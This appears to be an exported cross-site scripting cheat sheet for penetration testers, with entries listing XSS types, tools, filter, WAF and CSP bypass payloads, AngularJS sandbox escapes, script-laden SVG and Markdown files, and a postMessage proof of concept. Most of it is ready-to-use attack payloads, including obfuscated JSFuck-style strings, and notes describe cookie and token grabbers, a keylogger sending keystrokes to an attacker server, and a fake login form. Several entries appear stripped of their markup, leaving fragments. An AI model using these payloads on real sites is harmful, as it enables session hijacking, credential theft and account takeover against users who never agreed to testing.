entries.title: Types of XSS
entries.body:
Reflected XSS - the code arrives in a link/parameter and executes in the victim's browser on click (not stored on the server).
Stored XSS - the code is saved on the server (comment, profile) and executes for everyone who opens the page.
DOM-based XSS - vulnerable JS modifies the DOM based on input; the payload never reaches the server, it executes directly in the browser - harder to detect.

entries.title: Where to look for XSS and how to report it
entries.body:
Any input that later gets rendered back to the user: search, name/profile, comments, contact forms, tickets.
The Referer and User-Agent headers often end up in admin-panel logs and custom analytics (fertile ground for blind XSS).
For a strong PoC don't stop at alert(): demonstrate real impact - cookie/token theft, PII, session hijacking, account takeover.

entries.title: Don't use alert(1) - go with document.domain / origin
console.log instead of alert for Stored XSS
entries.body: <script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
entries.meta: alert() has to be dismissed on every trigger - for Stored XSS that's painful; console.log writes to the console without interaction.

entries.title: Open the debugger instead of alert
entries.meta: Opens the debugger in the developer console instead of a pop-up alert.

entries.title: Tools for detecting XSS
entries.body:
XSStrike - popular, but poorly maintained.
xsser - uses a headless browser.
Dalfox - many features, very fast (Go).
XSpear - a Ruby equivalent of Dalfox.
domdig - a DOM XSS tester on headless Chrome.
Most of these tools are also suitable for blind XSS.

entries.title: Basic payloads (script)
entries.meta: 8680439..toString(30) === "alert", 983801..toString(36) === "l33t" — building the function name from numbers to bypass a name filter.

entries.title: img onerror
entries.body: "> "> <>
entries.meta: oneonerrorrror - if the filter strips the string "onerror" once, a valid onerror remains after stripping.

entries.title: svg onload
entries.meta: <script href=data:,alert(1) /> (self-closing script) works only in Firefox.

entries.title: div pointer events
entries.body:
MOVE HERE
MOVE HERE
MOVE HERE
MOVE HERE
MOVE HERE
MOVE HERE
MOVE HERE

entries.title: HTML5 tags with auto-trigger
entries.body:
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

entries.title: HTML5 touch events (mobile)
entries.meta: ontouchstart - finger touches the screen; ontouchend - finger lifted; ontouchmove - finger moves across the screen.

entries.title: Loading remote JS
entries.meta: 14.rs - a short JS hosting service; you can set an arbitrary payload via 14.rs/#alert(document.domain).

entries.title: XSS in a hidden input (accesskey)
entries.meta: Triggers via CTRL+SHIFT+X (the accesskey combination).

entries.title: XSS in a hidden input (newer browsers)
entries.meta: Works in newer browsers: firefox-130 / chrome-108.

entries.title: XSS in output forced to UPPERCASE
entries.meta: If the page forces input to UPPERCASE - HTML entities are decoded after the case conversion, so alert stays lowercase.

entries.title: XSS in a JS context (no quotes)
entries.meta: Payload without single/double quotes, from @brutelogic. Suitable when input is placed inside a JS string/expression.

entries.title: Breaking out of a JS string inside <script>
entries.meta: The HTML parser closes <script> at the literal </script> even inside a JS string - use this to break the string and open a new script.

entries.title: DOM-based XSS (via a DOM sink)
entries.meta: Via location.hash / another DOM source that reaches a dangerous sink (innerHTML, etc.).

entries.title: javascript: - Hex / Octal / Unicode encoding
entries.meta: Encode the string "javascript:" in Hex / Unicode / Octal.

entries.title: javascript: - newline / tab / escape / comment
entries.meta: %0a=LF, %09=tab, %0d=CR - the line-break characters inside "java...script:" are ignored. Also escaping \j\a... and the "// + line break" trick.

entries.title: How the browser parses the javascript: protocol (scheme)

meta.caption: Console demo: a.href="javascript:alert()"; a.protocol -> "javascript:". If you insert //:%0aalert() - a.protocol becomes ":". An illustration of why a line break and slashes break scheme parsing. Source: PayloadsAllTheThings.

entries.title: Wrapper data:
entries.meta: base64 PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ = <svg/onload=alert(2)>; YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ== = alert(document.domain).

entries.title: Polyglot 0xsobky (Ultimate XSS Polyglot)
entries.meta: The best-known polyglot: works in HTML, attributes, JS, and in style/title/textarea/script contexts.

entries.title: Polyglots filedescriptor (Polyglot Challenge)
Bypassing a case-sensitive filter
entries.meta: Many filters catch only the exact lowercase/uppercase pattern - mixed case bypasses them.

entries.title: Bypassing a word blacklist via eval
Bypassing via an unclosed / incomplete HTML tag
entries.meta: Works in IE/Firefox/Chrome/Safari - the browser completes the tag.

entries.title: Bypassing a dot (.) filter
entries.meta: Bracket notation instead of the dot. atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ==") = alert(document.cookie). IP in decimal form: http://192.168.1.1 == http://3232235777.

entries.title: Bypassing without parentheses and semicolons (throw onerror)
entries.meta: From @garethheyes, @terjanq, @cgvwzq. onerror=alert + throw calls alert with the exception as its argument.

entries.title: Bypassing an onxxxx= blacklist
entries.meta: Little-known on*scriptexecute handlers; inserting null/vtab/CR/LF/'/' between onerror and '='.

entries.title: Bypassing a space filter
entries.meta: A slash instead of a space; or the separators 0x0c/0x0d/0x0a/0x09. Example (0x0c between tokens): <svg^Lonload^L=^Lalert(1)^L> where ^L = 0x0c.

entries.title: Bypassing via the Email format (RFC)
entries.meta: The first is an RFC0822-valid address; the second is RFC5322 (a comment in parentheses).

entries.title: Bypassing via a Tel URI (;phone-context=)
entries.meta: The ;phone-context= descriptor is mentioned in RFC3966 and RFC2806.

entries.title: Bypassing a document.cookie blacklist (cookieStore)
entries.meta: Accessing cookies in Chrome/Edge/Opera via the cookieStore API. Replace COOKIE NAME; there is also a getAll() method.

entries.title: Alternative ways to call alert
entries.body:
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)

[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
entries.meta: From @brutelogic - calling alert through a carrier object or through array methods (callback).

entries.title: Alternative alert via constructor / global vars
entries.meta: From @404death and @quanyang. Accessing alert via an index of the global object: self[Object.keys(self)[5]]("1").

entries.title: Don't close the tag '>'
entries.meta: Closing the tag is not required - the browser will complete it itself.

entries.title: Bypassing '<' and '>' via ＜ ＞ (fullwidth)
entries.meta: The characters U+FF1C and U+FF1E. On normalization/conversion they are replaced with < and >.

entries.title: Bypassing ';' with another operator character
entries.meta: If ';' is filtered - any binary operator can separate the expression.

entries.title: Bypassing via ECMAScript6 (DiacriticalGrave)
entries.meta: ` decodes to a backtick ` -> alert`1`.

entries.title: Bypassing via Unicode escape
entries.meta: \u0061\u006C\u0065\u0072\u0074 = a l e r t. JS identifiers can be written with Unicode escapes.

entries.title: Bypassing via Unicode characters (fullwidth/modifier/case)
entries.meta: \uFF1C/\uFF1E -> </>; \u02BA/\u02B9 -> "/'. The characters ſ (U+017F) and ı (U+0131) turn into s/i after toUpperCase/toLowerCase and make the tags valid.

entries.title: Bypassing via UTF-16be / UTF-32 / BOM
entries.meta: Requires the absence of charset in Content-Type. The BOM lets you override the page encoding; the page must start with the BOM character.

entries.title: Bypassing via absence of charset (ISO-2022-JP)
entries.meta: Requirement: there is no charset in Content-Type (text/html). ISO-2022-JP: %1b(J switches to JIS X 0201 1976, where 0x5c '\' becomes '¥', removing the escaping of the quote \' -> ¥'.

entries.title: Bypassing via exotic alphabets (Katakana / Cuneiform / Lontara)
entries.body:
// Katakana (aemkei/katakana.js)
javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()

// Cuneiform
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
entries.meta: JSFuck-style obfuscation using the Katakana/Cuneiform/Lontara alphabets - bypasses signature-based filters. More alphabets: aem1k.com/aurebesh.js.

entries.title: Bypassing via JSFuck
entries.meta: Entirely from the characters []()!+ - http://www.jsfuck.com/.

entries.title: Cloudflare
entries.meta: A collection of Cloudflare bypasses (2018-2021), mostly from @bohdansec.

entries.title: Fortiweb / Chrome Auditor
entries.meta: The first is for Fortiweb (@rezaduty); the second is for the deprecated Chrome XSS Auditor.

entries.title: Tools for CSP
entries.body:
csp-evaluator.withgoogle.com - checks how strong a CSP is against XSS.
gmsgadget.com (GMSGadget) - a collection of JS gadgets for bypassing CSP and sanitizers (DOMPurify).
JSONBee/jsonp.txt - ready-made JSONP endpoints for bypassing.

entries.title: Bypassing CSP via JSONP
entries.meta: If the whitelist contains google.com/youtube.com - use their JSONP callback. Examples: //google.com/complete/search?client=chrome&jsonp=alert(1); https://accounts.google.com/o/oauth2/revoke?callback=alert(1337); https://www.youtube.com/oembed?callback=alert;

entries.title: Bypassing CSP default-src (iframe + appendChild)
entries.meta: For CSP default-src 'self' 'unsafe-inline'. Create an iframe with a same-origin document and add an external script into its head. Source: lab.wallarm.com.

entries.title: Bypassing CSP inline/eval (CSS link -> iframe)
entries.meta: Source: Rhynorater.

entries.title: Bypassing CSP script-src 'self' (object + data:)
entries.meta: base64 = <script>alert(1)</script>. Source: @akita_zen.

entries.title: Bypassing CSP script-src data:
entries.meta: For CSP script-src 'self' data: - as the Mozilla documentation warns.

entries.title: Bypassing CSP unsafe-inline
entries.meta: For script-src ... 'unsafe-inline' - inline scripts are allowed.

entries.title: Bypassing CSP nonce (<base> injection)
entries.meta: If there is a script with a relative path <script src='/PATH.js'> - the <base> tag will redirect its loading to your server (host your own /PATH.js at the same path).

entries.title: Bypassing CSP sent via PHP header()
entries.meta: In php:apache, PHP cannot set the CSP header if the response body has already begun to be written. Generate a Warning (>1000 GET/POST parameters or 20 $_FILES) -> 'headers already sent' -> CSP won't be applied. Source: @pilvar222.

entries.title: AngularJS 1.6+ - basic CSTI
entries.meta: Requires an ng-app directive on the root element. As of version 1.6 AngularJS removed the sandbox. Also works for AngularJS 1.0.1-1.1.5 and Vue JS.

entries.title: AngularJS 1.6.0 - constructor variants
entries.meta: From @LewisArdern and @garethheyes.

entries.title: AngularJS - bypass without quotes
entries.meta: Without single or double quotes, from @Viren. fromCharCode(97,108,...) = alert(1).

entries.title: AngularJS - bypass without quotes and the word constructor
entries.meta: a = 767015343..toString(36)+50986827..toString(36) = 'constructor'. The payload = prompt(document.domain).

entries.title: AngularJS - Blind XSS (loading an external script)
entries.meta: For 1.0.1-1.1.5 and >1.6.0 (Lewis Ardern, Gareth Heyes). Loads //localhost/m. The older variant uses constructor.constructor instead of $on.constructor.

entries.title: Angular - sanitizer bypass (bypassSecurityTrust*)
entries.meta: Angular sanitizes values by default. These DomSanitizer methods mark a value as trusted and disable sanitization. During code review, make sure no user input reaches them - otherwise XSS (e.g. bypassSecurityTrustUrl('javascript:alert("Hi there")')).

entries.title: XSS in XML (CDATA)
entries.meta: The CDATA section is needed so the JS payload is not interpreted as XML markup.

entries.title: XSS in SVG - simple (green triangle)
entries.body:
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
entries.meta: Upload it as a .svg file - the script will execute when opened in a browser.

entries.title: XSS in SVG - all vectors (red lightning)
entries.body:
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" width="100" height="100" xmlns="http://www.w3.org/2000/svg" onload="alert('svg attribut')">
  <polygon id="lightning" points="0,100 50,25 50,75 100,0" fill="#ff1919" stroke="#ff0000"/>
  <desc><script>alert('svg desc')</script></desc>
  <foreignObject><script>alert('svg foreignObject')</script></foreignObject>
  <foreignObject width="500" height="500">
    <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert('svg foreignObject iframe');" width="400" height="250"/>
  </foreignObject>
  <title><script>alert('svg title')</script></title>
  <animatetransform onbegin="alert('svg animatetransform onbegin')"></animatetransform>
  <script type="text/javascript">
    alert('svg script');
  </script>
</svg>
entries.meta: Vectors: svg onload attribute, desc/foreignObject/title script, foreignObject iframe, animatetransform onbegin. Author: noraj.

entries.title: Nested SVG (sub-SVG, french flag)
entries.body:
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <svg x="10">
    <rect x="10" y="10" height="100" width="100" style="fill: #002654"/>
    <script type="text/javascript">alert('sub-svg 1');</script>
  </svg>
  <svg x="200">
    <rect x="10" y="10" height="100" width="100" style="fill: #ED2939"/>
    <script type="text/javascript">alert('sub-svg 2');</script>
  </svg>
</svg>
entries.meta: Loading a remote SVG via xlink:href does NOT trigger the nested XSS; but embedding an <svg> inside an SVG document executes the XSS from the sub-SVG. Author: noraj.

entries.title: XSS in Markdown
entries.body:
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)

entries.title: XSS in CSS (</style> breakout)
entries.meta: The literal </style> inside a CSS value closes the style block and lets you insert <svg onload>.

entries.title: XSS via postMessage (targetOrigin *)
entries.body:
<html>
<body>
    <input type=button value="Click Me" id="btn">
</body>

<script>
document.getElementById('btn').onclick = function(e){
    window.poc = window.open('http://10.10.10.10/#login');
    setTimeout(function(){
        window.poc.postMessage(
            {
                "sender": "accounts",
                "url": "javascript:confirm('XSS')",
            },
            '*'
        );
    }, 2000);
}
</script>
</html>
entries.meta: If the target origin is '*', the message can be sent to any domain that has a reference to the child page. A vulnerable listener that trusts the url from the message will execute javascript:.

entries.title: Blind XSS - loading an external script
entries.meta: XSS Hunter (xsshunter.com) is deprecated; there is a self-hosted version (mandatoryprogrammer/xsshunter-express) and xsshunter.trufflesecurity.com. Other tools: sleepy-puppy, bXSS, ezXSS.

entries.title: Blind XSS - where to look and a quick check
entries.meta: Injection points: contact forms, ticket support, the Referer/User-Agent headers (admin-panel logs and analytics), comments. Before launching a heavy blind-XSS tool, confirm the trigger with a simple grabber + a one-line HTTP server: ruby -run -ehttpd . -p8080

entries.title: Cookie / token theft (Data Grabber)
entries.meta: Sends the admin's cookie/access_token to a page you control. The new Image() variant works stealthily (without a redirect).

entries.title: Server-side cookie receiver (PHP grabber)
entries.meta: grabber.php - writes the received cookies to the file cookies.txt.

entries.title: JavaScript keylogger
entries.meta: Captures keystrokes and sends them to the attacker's server.

entries.title: UI Redressing - fake login form
entries.meta: Through XSS, replaces the page content with a fake login form (and also fixes the URL via history.replaceState).

entries.title: Mutation XSS (mXSS, DOMPurify bypass)
entries.meta: Uses browser quirks to reassemble HTML tags via innerHTML mutations. Masato Kinugawa's example against cure53/DOMPurify on Google Search.

entries.title: Modern auto-events and wrappers (popover, onformdata, import)
entries.body: x
entries.meta: Low-profile modern vectors against signature WAFs that do not know these tags/handlers yet: Popover API (onbeforetoggle/ontoggle), <svg><use> with a data: URI, onformdata on submit, dynamic import() as an eval replacement, <track onerror>. popover/track need interaction or a media context.

entries.title: Alternative call: Reflect.get, valueOf, hash
entries.meta: Reflect.get(obj,'name') reads a property by an assembled string instead of dot notation (function-name blacklist bypass). window.valueOf=alert plus arithmetic on window triggers alert via implicit number coercion. location.hash.slice(1) carries the payload into the #fragment, invisible to a server-side WAF (pure DOM XSS).
